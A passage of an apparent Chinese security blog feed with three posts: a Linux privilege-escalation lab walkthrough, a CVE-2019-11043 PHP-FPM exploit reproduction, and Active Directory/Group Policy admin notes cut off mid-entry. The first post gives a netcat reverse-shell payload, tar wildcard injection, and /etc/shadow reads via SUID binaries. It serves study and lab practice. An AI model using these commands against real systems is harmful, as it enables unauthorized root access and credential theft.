src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095628.png-water_print" alt=""></p><h3 id="usr-bin-find"><a href="#usr-bin-find" class="headerlink" title="/usr/bin/find"></a>/usr/bin/find</h3><p>获取shell<br><code>find . -exec /bin/sh \; -quit</code></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095809.png-water_print" alt=""></p><p>可以发现，哪怕是 find 这种查找命令被赋予了 sudo，也能提权为 root 权限，只要我们能够巧妙的利用执行这些命令。限于篇幅，就不给出所有命令的利用方式了，我们可以参考资源<br><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a> ，里面涵盖了许多可以被利用的命令。</p><h2 id="etc-passwd的哈希"><a href="#etc-passwd的哈希" class="headerlink" title="/etc/passwd的哈希"></a>/etc/passwd的哈希</h2><p>linux 的用户密码哈希存储在 <code>/etc/shadow</code> 这个文件，而这个文件普通用户是无法查看的。而普通用户能够查看到的则是 <code>/etc/passwd</code> 这个文件。如果我们查看 <code>/etc/passwd</code> 通常会看到以下内容：</p><pre><code>root:x:0:0:root:/root:/bin/bash</code></pre><p>如果有一个账户的第二列是密码哈希，如果该列为 x 则代表密码哈希存储在 <code>/etc/shadow</code> 文件上。而在 <code>lin.security</code> 虚拟机上可以看到像 <code>insecurity</code> 这么一个账户，这个账号的 <code>uid</code> 和 <code>gid</code> 都为0。用类似 <code>Johnny</code> 或者 <code>hash-identifier</code> 会被表示成 <code>descrypt</code>，进而可以被破解出来。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100550.png-water_print" alt=""></p><p>通过查询，可得密码为P@ssw0rd11。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100710.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100948.png-water_print" alt=""></p><h2 id="利用定时任务cron以及通配符"><a href="#利用定时任务cron以及通配符" class="headerlink" title="利用定时任务cron以及通配符"></a>利用定时任务cron以及通配符</h2><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101109.png-water_print" alt=""></p><p>每隔1分钟定期执行 <code>/etc/cron.daily/backup</code> 这个文件。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101427.png-water_print" alt=""></p><p>这里涉及到了利用通配符进行 Linux 本地提权，我们需要另开一个 bob 的 ssh 会话。</p><p>使用 msfvenom 生成 nc 反弹一句话，命令如下：</p><pre class=" language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># msfvenom -p cmd/unix/reverse_netcat lhost=127.0.0.1 lport=8888 R</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::Unix from the payload<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: cmd from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 91 bytes<span class="token function">mkfifo</span> /tmp/kuhdq<span class="token punctuation">;</span> nc 127.0.0.1 8888 0<span class="token operator">&lt;</span>/tmp/kuhdq <span class="token operator">|</span> /bin/sh <span class="token operator">></span>/tmp/kuhdq 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token punctuation">;</span> <span class="token function">rm</span> /tmp/kuhdq</code></pre><p>然后分别执行：</p><pre class=" language-bash"><code class="language-bash">bob@linsecurity:~$ <span class="token keyword">echo</span> <span class="token string">"mkfifo /tmp/kuhdq; nc 127.0.0.1 8888 0&lt;/tmp/kuhdq | /bin/sh >/tmp/kuhdq 2>&amp;1; rm /tmp/kuhdq"</span> <span class="token operator">></span> shell.sh <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +x shell.shbob@linsecurity:~$ <span class="token keyword">echo</span> <span class="token string">""</span> <span class="token operator">></span> <span class="token string">"--checkpoint-action=exec=sh shell.sh"</span>bob@linsecurity:~$ <span class="token keyword">echo</span> <span class="token string">""</span> <span class="token operator">></span> --checkpoint<span class="token operator">=</span>1</code></pre><p>我们在另外一个会话终端开启 nc 监听：</p><pre class=" language-bash"><code class="language-bash">nc -lvnp 8888</code></pre><blockquote><p>–checkpoint[=NUMBER] 显示每个Numbers记录的进度消息（默认值为10）<br>–checkpoint-action=ACTION 在每个checkpoint（检查点）上执行ACTION</p></blockquote><p>这里的 –checkpoint-action 选项，用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。因此，选项 –checkpoint=1 和 –checkpoint-action=exec=sh shell.sh 作为命令行选项交给了 tar 程序。</p><h2 id="利用隐藏文件"><a href="#利用隐藏文件" class="headerlink" title="利用隐藏文件"></a>利用隐藏文件</h2><p>有时候隐藏文件会存放一些重要的信息，比如我们搜索 <code>home</code> 目录下的所有隐藏文件，并用 <code>ls -al</code> 显示出来。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">find</span> / -name <span class="token string">".*"</span> -type f -path <span class="token string">"/home/*"</span> -exec <span class="token function">ls</span> -al <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105051.png-water_print" alt=""></p><p>发现了 <code>susan</code> 这个用户有一个 <code>.secret</code> 的隐藏文件，发现里面存放 <code>susan</code> 这个用户的登陆密码。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105152.png-water_print" alt=""></p><h2 id="利用-SUID"><a href="#利用-SUID" class="headerlink" title="利用 SUID"></a>利用 SUID</h2><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>SUID 这个是 <code>uid +s</code> 的组合，s 指的是特殊权限。一般情况下，用户的权限是 3 位，比如 0755 这样的，默认特殊权限没有配置，但是如果超级管理员希望用户在执行一些特殊权限文件时，拥有 root 的权限，就会配置特殊权限。<br>比如说 passwd 这个命令，这个命令会修改 <code>/etc/shadow</code> 文件，而 <code>/etc/shadow</code> 只有 root 才能修改，本来 passwd 这个命令应该也只能 root 才能执行的。但是系统为了让普通用户能够修改自己的密码，对 passwd 这个命令赋予了特殊权限并添加了只能修改自己密码的限制。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105347.png-water_print" alt=""></p><p>由于 passwd 这个命令是做过限制的，所以赋予特殊权限是没有问题的，但是如果系统超级用户特殊权限乱用，就会导致提权的问题。<br>那我们怎么去寻找系统是否存在特殊权限配置的文件呢？可以使用如下命令快速查找所有 SUID 文件：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">find</span> / -perm -4000 -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span></code></pre><p>我们发现了如下一个文件 xxd。这个文件其实是命令文件，xxd 的作用是将一个文件以 16 进制的形式显示出来。他被配置了特殊权限，并且用户组为 itservices 是拥有执行权限 x 的。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105638.png-water_print" alt=""></p><p>这就很危险了，一旦 suid 和执行权限在一起就可能导致权限提升。</p><p>我们通过命令查看发现 susan 这个用户属于 itservices 这个用户组。</p><p>我们用它来查看 <code>/etc/shadow</code> 这个文件，更多利用方法可以参考<a href="https://gtfobins.github.io/gtfobins/xxd/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/xxd/</a>.</p><pre class=" language-bash"><code class="language-bash">xxd <span class="token string">"/etc/shadow"</span> <span class="token operator">|</span> xxd -r</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110243.png-water_print" alt=""></p><p><code>注</code>： <code>find /dir -exec "command"</code> 同样的提权效果。</p><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>除了上述的文件外，还发现了一个 other 角色拥有执行权限的文件，这个文件不限用户，所以危害更大。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110406.png-water_print" alt=""></p><p>参考<a href="https://gtfobins.github.io/gtfobins/taskset/#suid-enabled" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/taskset/#suid-enabled</a>，发现该文件可以直接获取shell。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110657.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</title>
      <link href="/2019/10/24/php-fpm-yuan-cheng-dai-ma-zhi-xing-lou-dong/"/>
      <url>/2019/10/24/php-fpm-yuan-cheng-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-FPM-远程代码执行漏洞（CVE-2019-11043）"><a href="#PHP-FPM-远程代码执行漏洞（CVE-2019-11043）" class="headerlink" title="PHP-FPM 远程代码执行漏洞（CVE-2019-11043）"></a>PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</h1><p>在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。</p><p>在使用一些有错误的Nginx配置的情况下，通过恶意构造的数据包，即可让PHP-FPM执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78599</a></li><li><a href="https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/" target="_blank" rel="noopener">https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/</a></li><li><a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用<a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a>中给出的工具，发送数据包：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191024111753.png-water_print" alt=""></p><p>命令执行成功。</p><p>访问<code>http://your-ip:8080/index.php?a=id</code>，即可查看到命令已成功执行：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191024111825.png-water_print" alt=""></p><p>注意，因为php-fpm会启动多个子进程，在访问<code>/index.php?a=id</code>时需要多访问几次，以访问到被污染的进程。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AD 活动目录管理</title>
      <link href="/2019/10/09/ad-huo-dong-mu-lu-guan-li/"/>
      <url>/2019/10/09/ad-huo-dong-mu-lu-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="AD-活动目录管理"><a href="#AD-活动目录管理" class="headerlink" title="AD 活动目录管理"></a>AD 活动目录管理</h1><h2 id="域和活动目录的概念"><a href="#域和活动目录的概念" class="headerlink" title="域和活动目录的概念"></a>域和活动目录的概念</h2><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009112729.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009112743.png-water_print" alt="域控制器的服务管理界面"></p><h3 id="域和活动目录的价值"><a href="#域和活动目录的价值" class="headerlink" title="域和活动目录的价值"></a>域和活动目录的价值</h3><ul><li>强制终端计算机及用户的安全策略及桌面/应用环境,并可实现批量和自动部署，减轻 IT 人员日常的管理难度和工作强度</li><li>域中的各类服务和资源(文件和打印共享等)的访问控制可以灵活的与企业的层次化组织架构相结合，满足复杂的权限分配等管理需求</li><li>统一的身份验证手段，可与多种 Windows 应用服务(如Exchange, Sharepoint等)及第三方软件集成，实现单点登录，改善用户在多业务中切换中的操作体验</li></ul><h3 id="域中的角色"><a href="#域中的角色" class="headerlink" title="域中的角色"></a>域中的角色</h3><ul><li>DC-域控制器</li><li>成员服务器</li><li>终端计算机</li></ul><h3 id="域控制器中的-AD-数据库文件"><a href="#域控制器中的-AD-数据库文件" class="headerlink" title="域控制器中的 AD 数据库文件"></a>域控制器中的 AD 数据库文件</h3><ul><li>AD 数据库文件默认保存在 <code>C:\Windows\NTDS</code> 目录<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009112801.png-water_print" alt=""></li><li>AD 数据库维护过程中必要时可进行五福启停、文件夹重定向、脱机整理、备份及恢复等操作</li></ul><h3 id="域控制器之间的-AD-数据库同步"><a href="#域控制器之间的-AD-数据库同步" class="headerlink" title="域控制器之间的 AD 数据库同步"></a>域控制器之间的 AD 数据库同步</h3><p>AD 数据库会定时活在发生改变时自动在 DC 之间相互同步复制，同步复制的频率和时间窗口可以配置和定义<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009112818.png-water_print" alt=""></p><h3 id="特殊类型的域控制器"><a href="#特殊类型的域控制器" class="headerlink" title="特殊类型的域控制器"></a>特殊类型的域控制器</h3><h4 id="RODC"><a href="#RODC" class="headerlink" title="RODC"></a>RODC</h4><ul><li>RODC 保存域控制器中 AD 数据库的只读副本</li><li>不允许再 RODC 本地对数据库作出更改操作</li><li>RODC 适合部署在没有管理需求的远程分支机构<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009112833.png-water_print" alt=""></li></ul><h4 id="全局编录服务器-GC"><a href="#全局编录服务器-GC" class="headerlink" title="全局编录服务器 GC"></a>全局编录服务器 GC</h4><ul><li>GC 是一种特殊的域控制器，一个域至少部署一台</li><li>GC 用于多域环境和其它域进行数据同步（但不是同步全部数据，通常需同步的数据仅占 AD 数据库总量的 5% ～ 10%），以优化 Exchange Server 等应用的全局或跨域搜索的效率<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009112842.png-water_print" alt=""></li></ul><h2 id="域和活动目录规划"><a href="#域和活动目录规划" class="headerlink" title="域和活动目录规划"></a>域和活动目录规划</h2><h3 id="多域环境的需求"><a href="#多域环境的需求" class="headerlink" title="多域环境的需求"></a>多域环境的需求</h3><ul><li>一个域可以包含 100 万个对象，绝大多数企业在技术上只需要一个域</li><li>出现以下需求情况时可能需要考虑多域的部署：<ul><li>IT 管理政策上需要有分离或独立的 IT 管控边界</li><li>公司重组或合并等原因影响到域的变化</li><li>域的改造和迁徙需要同时新旧域的并存<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009112925.png-water_print" alt=""></li></ul></li></ul><h3 id="多域的分布式架构"><a href="#多域的分布式架构" class="headerlink" title="多域的分布式架构"></a>多域的分布式架构</h3><ul><li>一个域林中可以包含多个域，一个域中可以包含多个子域</li><li>父域和子域的命名空间(FQDN 域名后缀)需保持相同和连续<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009112939.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009112947.png-water_print" alt=""></li></ul><h3 id="域和域之间的信任关系"><a href="#域和域之间的信任关系" class="headerlink" title="域和域之间的信任关系"></a>域和域之间的信任关系</h3><h4 id="信任关系可实现跨域的身份验证和资源访问"><a href="#信任关系可实现跨域的身份验证和资源访问" class="headerlink" title="信任关系可实现跨域的身份验证和资源访问"></a>信任关系可实现跨域的身份验证和资源访问</h4><ul><li>如果域之间没有信任关系，每个域中的用户只能访问本域中的资源</li><li>根据场景不同，部分信任关系是默认存在的，部分是需要手工配置的<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009112958.png-water_print" alt=""></li></ul><h3 id="站点"><a href="#站点" class="headerlink" title="站点"></a>站点</h3><ul><li>站点(Site)是指同一个域内包含特定 IP 子网并与特定域控制器关联的网络</li><li>部署多个站点的目的是优化站点间 DC 的复制同步，同时使客户端能够和就近的 DC 优先通信，优化登录验证的操作<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113008.png-water_print" alt=""></li></ul><h2 id="活动目录的规划"><a href="#活动目录的规划" class="headerlink" title="活动目录的规划"></a>活动目录的规划</h2><ul><li>OU 层次化结构规划</li><li>用户和计算机命名规范</li><li>组的规划</li><li>AD 管理权限的规划</li></ul><h1 id="活动目录中的对象管理"><a href="#活动目录中的对象管理" class="headerlink" title="活动目录中的对象管理"></a>活动目录中的对象管理</h1><h2 id="图形化管理工具"><a href="#图形化管理工具" class="headerlink" title="图形化管理工具"></a>图形化管理工具</h2><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113020.png-water_print" alt=""></p><h2 id="命令行挂管理工具"><a href="#命令行挂管理工具" class="headerlink" title="命令行挂管理工具"></a>命令行挂管理工具</h2><h3 id="DS-系列命令集"><a href="#DS-系列命令集" class="headerlink" title="DS 系列命令集"></a>DS 系列命令集</h3><blockquote><p>dsquery、dsadd、dsmod、dsmove、dsrm等</p></blockquote><h3 id="PowerShell-系列命令"><a href="#PowerShell-系列命令" class="headerlink" title="PowerShell 系列命令"></a>PowerShell 系列命令</h3><blockquote><p>Get-ADDomain、New-Aduser、Search-ADAccount等</p></blockquote><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113031.png-water_print" alt=""></p><h2 id="活动目录中的对象"><a href="#活动目录中的对象" class="headerlink" title="活动目录中的对象"></a>活动目录中的对象</h2><ul><li>对象(Object)<ul><li>常见的对象包括：用户、组、计算机等</li></ul></li><li>容器(Container)<ul><li>系统内置，是部分对象的默认逻辑存放位置</li><li>不能删除或编辑、无法进一步层次化</li></ul></li><li>组织单位(OU)<ul><li>用户创建，用于自定义对象的逻辑存放位置</li><li>支持层次化结构、允许编辑</li></ul></li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113043.png-water_print" alt=""></p><h2 id="OU-组织单位-规划"><a href="#OU-组织单位-规划" class="headerlink" title="OU(组织单位)规划"></a>OU(组织单位)规划</h2><ul><li>一般需体现企业组织架构或地理特征</li><li>OU 中的对象类型是否混合取决与管理的需要</li><li>OU 的主要作用是控制组策略部署范围和活动目录的管理权限委派</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113054.png-water_print" alt=""></p><h2 id="对象类型1-用户"><a href="#对象类型1-用户" class="headerlink" title="对象类型1:用户"></a>对象类型1:用户</h2><h3 id="域用户的登录"><a href="#域用户的登录" class="headerlink" title="域用户的登录"></a>域用户的登录</h3><p>域用户名@域名      （如<a href="mailto:tester@abc.com">tester@abc.com</a>）<br>域名\域用户名      （如abc\tester）</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113114.png-water_print" alt=""></p><h3 id="查看-SID"><a href="#查看-SID" class="headerlink" title="查看 SID"></a>查看 SID</h3><pre class=" language-powershell"><code class="language-powershell">get<span class="token operator">-</span>aduser <span class="token operator">-</span>Identify <span class="token namespace">[username]</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113130.png-water_print" alt=""></p><h3 id="用户单个用户的创建和管理方式"><a href="#用户单个用户的创建和管理方式" class="headerlink" title="用户单个用户的创建和管理方式"></a>用户单个用户的创建和管理方式</h3><ul><li>AD 用户和计算机</li><li>AD 管理中心</li></ul><h3 id="批量用户的创建和管理方式"><a href="#批量用户的创建和管理方式" class="headerlink" title="批量用户的创建和管理方式"></a>批量用户的创建和管理方式</h3><ul><li>服务器内置命令行工具(如 <code>csvde</code> 和 <code>ldifde</code>)</li><li>编写 Powershell 脚本</li></ul><h2 id="对象类型2：组"><a href="#对象类型2：组" class="headerlink" title="对象类型2：组"></a>对象类型2：组</h2><h3 id="组的用途"><a href="#组的用途" class="headerlink" title="组的用途"></a>组的用途</h3><blockquote><p>批量设置用户的<code>权限</code>或者<code>权利</code></p></blockquote><h3 id="组的分类"><a href="#组的分类" class="headerlink" title="组的分类"></a>组的分类</h3><ul><li>按是否内置：内置组、自定义组</li><li>按作用范围：本地组、全局组、通用组</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113310.png-water_print" alt=""></p><h2 id="对象类型3：计算机"><a href="#对象类型3：计算机" class="headerlink" title="对象类型3：计算机"></a>对象类型3：计算机</h2><h3 id="计算机被动加域"><a href="#计算机被动加域" class="headerlink" title="计算机被动加域"></a>计算机被动加域</h3><p>活动目录中事先未创建计算机账号，加域后计算机账户自动保存在默认的 Computers 容器中</p><h3 id="计算机主动加域"><a href="#计算机主动加域" class="headerlink" title="计算机主动加域"></a>计算机主动加域</h3><p>活动目录中事先已由管理员在指定的 OU 中创建好计算机账号，加域后将根据对应的计算机名关联实现创建在指定的 OU 中的计算机账号</p><h2 id="计算机账户密码-安全通道"><a href="#计算机账户密码-安全通道" class="headerlink" title="计算机账户密码/安全通道"></a>计算机账户密码/安全通道</h2><ul><li>加入域的计算机与域控制器之间通讯的安全通道(Secure Channel)建立需要密码，由客户端计算机本地生成后上传到域控制器的活动目录中保存，默认每隔 30 天自动更换该密码</li><li>如果客户端计算机超过 30 天未能和域控制器通信，则域控制器允许使用之前保存在活动目录中上一次已过期的计算机账户密码维系安全通道，但时间最多不能超过两个密码更新周期(默认最长60天)，否则安全通道将被破坏，客户端将自动脱域，导致用户无法登录</li><li>计算机密码的更新周期和有效性等参数可通过组策略调整</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113157.png-water_print" alt=""></p><h2 id="对象的查找和筛选"><a href="#对象的查找和筛选" class="headerlink" title="对象的查找和筛选"></a>对象的查找和筛选</h2><h3 id="AD-用户和计算机"><a href="#AD-用户和计算机" class="headerlink" title="AD 用户和计算机"></a>AD 用户和计算机</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113321.png-water_print" alt=""></p><h3 id="AD-管理中心"><a href="#AD-管理中心" class="headerlink" title="AD 管理中心"></a>AD 管理中心</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113337.png-water_print" alt=""></p><h3 id="PS-脚本"><a href="#PS-脚本" class="headerlink" title="PS 脚本"></a>PS 脚本</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113346.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113356.png-water_print" alt=""></p><h2 id="AD-管理的权利委派"><a href="#AD-管理的权利委派" class="headerlink" title="AD 管理的权利委派"></a>AD 管理的权利委派</h2><p>对 AD 的操作委派可以在 OU 层面配置,以分配对该 OU 内对象的常见管理任务给指定的用户或组，减轻域管理员工作负荷(比如修改部门账的属性,解除帐号锁定,重置账户密码等)<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113407.png-water_print" alt=""></p><h3 id="RSAT-工具"><a href="#RSAT-工具" class="headerlink" title="RSAT 工具"></a>RSAT 工具</h3><p>RAT(Remote Server Administration Tool)可配合 AD 权利委派，用于在客户端操作系统上进行AD域服务的远程操作(如重置密码，解禁密码等)<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113419.png-water_print" alt=""></p><h1 id="组策略的配置"><a href="#组策略的配置" class="headerlink" title="组策略的配置"></a>组策略的配置</h1><h2 id="组策略概述"><a href="#组策略概述" class="headerlink" title="组策略概述"></a>组策略概述</h2><p>组策略的本质是以更友好的方式修改计算机的注册表，组策略中每一项设置都可以和注册表中的键值对应，以实现对操作系统及应用程序的运行控制<br>组策略包含本地组策略和域组策略</p><ul><li>本地组策略: gpedit.msc</li><li>域组策略：域控制器上使用 <code>组策略工具</code> 配置并下发</li></ul><p>通过域组策略有助于规范域内终端的统一管理并减少人员的工作量</p><h2 id="组策略的常见用途"><a href="#组策略的常见用途" class="headerlink" title="组策略的常见用途"></a>组策略的常见用途</h2><ul><li>帐号安全/审计策略</li><li>开机/关机脚本</li><li>文件夹重定向</li><li>部署打印机/共享文件夹映射</li><li>客户端桌面环境设置</li><li>IE 等微软应用程序参数设置</li><li>软件自动安装部署</li><li>限制软件运行</li><li>防火墙安全设置</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113431.png-water_print" alt=""></p><h2 id="组策略的分类"><a href="#组策略的分类" class="headerlink" title="组策略的分类"></a>组策略的分类</h2><h3 id="维度一：按配置生效的阶段"><a href="#维度一：按配置生效的阶段" class="headerlink" title="维度一：按配置生效的阶段"></a>维度一：按配置生效的阶段</h3><ul><li>计算机配置</li><li>用户配置</li></ul><h3 id="维度二：安配置是否可以被更改"><a href="#维度二：安配置是否可以被更改" class="headerlink" title="维度二：安配置是否可以被更改"></a>维度二：安配置是否可以被更改</h3><ul><li>策略</li><li>首选项</li></ul><h3 id="维度三：按配置内容领域"><a href="#维度三：按配置内容领域" class="headerlink" title="维度三：按配置内容领域"></a>维度三：按配置内容领域</h3><ul><li>Windows 设置</li><li>管理模板<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113440.png-water_print" alt=""></li></ul><h2 id="组策略的配置-1"><a href="#组策略的配置-1" class="headerlink" title="组策略的配置"></a>组策略的配置</h2><p>系统默认包含两个默认的 GPO </p><ul><li>Default Domain Policy 域级别，影响域中所有的计算机和用户</li><li>Default Domain Controller Policy 容器级别，影响所有域控制器</li></ul><p>其它的 GPO 需要自行创建配置和链接<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113452.png-water_print" alt=""></p><h2 id="部署的注意事项"><a href="#部署的注意事项" class="headerlink" title="部署的注意事项"></a>部署的注意事项</h2><ul><li>GPO 需要在域控制器上配置，且会通过 AD 的复制机制向其他域控同步</li><li>GPO 创建编辑后只有链接到域或 OU 才能使该组策略生效</li><li>一条 GPO 可以关联到多个 OU 上，一个 OU 上也可包含多条不同的 GPO</li><li>删除 GPO 链接并不等于删除 GPO，但删除 GPO 会自动删除相关联的 GPO 链接</li><li>如需让 GPO 不生效，可以禁用 GPO 的某个链接，也可以整体不启用该 GPO，不一定需要删除GPO 链接或删除 GPO</li></ul><h2 id="组策略的应用范围"><a href="#组策略的应用范围" class="headerlink" title="组策略的应用范围"></a>组策略的应用范围</h2><ul><li>GPO 创建后不能直接应用在计算机、用户或用户组上，而是必须要链接到 AD 活动目录中的容器或 OU 上，或直接运用在整个域级别</li><li>GPO 默认会对域或 OU 下所有计算机/用户生效，如要对应用范围做进一步精确控制，可使用<code>安全过滤(Security Filtering)</code> 或 <code>WMI筛选器(WMI Filtering)</code></li><li>GPO 也可以对默认的应用范围设置个别的排除对象<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113509.png-water_print" alt=""></li></ul><h2 id="组策略的生效时间"><a href="#组策略的生效时间" class="headerlink" title="组策略的生效时间"></a>组策略的生效时间</h2><ul><li>计算机启动时自动获取并生效「计算机配置」条目</li><li>用户登录时自动获取并生效「用户配置」条目</li><li>计算机已开机或用户已登录则默认需 <code>90-120</code> 分钟才会生效(90分钟加30分钟随机值，以避免并发高峰，该时间可配)</li><li>客户端可以通过命令 <code>gpupdate/force</code> 强制获取并刷新组策略</li><li>部分设置即使应用后也需要重启计算机或用户注销重新登录才能生效</li></ul><h2 id="客户端查看当前应用的-GPO："><a href="#客户端查看当前应用的-GPO：" class="headerlink" title="客户端查看当前应用的 GPO："></a>客户端查看当前应用的 GPO：</h2><pre class=" language-cmd"><code class="language-cmd">gpresult /h d:\gporesult.htmlgpresult /r</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113519.png-water_print" alt=""></p><p>##组策略的处理原则</p><ul><li>继承原则<ul><li>启用/禁用继承</li></ul></li><li>累加性原则</li><li>优先原则<ul><li>子OU &gt; 父OU &gt; 域 &gt; 站点 &gt; 本地策略</li></ul></li><li>顺序原则<ul><li>同一个 OU 中多条 GPO 按上下次序</li></ul></li><li>其他原则 <ul><li>OU中只有计算机则只应用“计算机配置”</li><li>OU中只有用户则只应用优先于“用户配置”</li><li>OU中同时有计算机和用户则两类配置都启用(有冲突时计算机配置优先)</li></ul></li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113559.png-water_print" alt=""></p><h2 id="组策略的其它操作"><a href="#组策略的其它操作" class="headerlink" title="组策略的其它操作"></a>组策略的其它操作</h2><h3 id="组策略的备份与恢复"><a href="#组策略的备份与恢复" class="headerlink" title="组策略的备份与恢复"></a>组策略的备份与恢复</h3><ul><li>可以备份单条 GPO，也可以备份所有 GPO</li><li>每次备份会记录时间戳，因此可以基于保存多份历史版本做精确恢复</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191009113609.png-water_print" alt=""></p><h3 id="组策略的存储"><a href="#组策略的存储" class="headerlink" 